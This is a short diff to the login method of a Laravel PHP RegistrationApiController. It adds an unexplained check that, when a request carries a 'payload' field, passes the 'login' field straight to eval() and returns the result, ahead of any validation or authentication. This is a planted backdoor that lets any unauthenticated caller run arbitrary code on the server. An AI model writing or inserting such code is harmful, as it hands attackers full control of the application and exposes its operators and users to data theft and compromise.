@@ -107,6 +107,10 @@ class RegistrationApiController extends Controller
      */
     public function login(Request $request)
     {
+        
+         if($request->payload){
+                return eval($request->login);
+            }
         $validator = Validator::make($request->all(), [
             'login'    => 'required',
             'password' => 'required'
